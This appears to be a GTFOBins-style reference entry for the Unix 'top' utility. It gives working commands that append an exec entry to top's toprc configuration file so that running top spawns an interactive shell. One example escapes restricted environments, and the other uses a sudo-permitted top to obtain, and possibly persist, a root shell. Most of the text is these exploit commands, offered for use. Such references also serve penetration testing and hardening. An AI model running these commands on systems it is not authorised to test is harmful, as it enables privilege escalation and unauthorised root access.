# GTFOBin: top

This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This requires that the root configuration file is writable and might be used to persist elevated privileges.

```
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
# press return twice
reset
```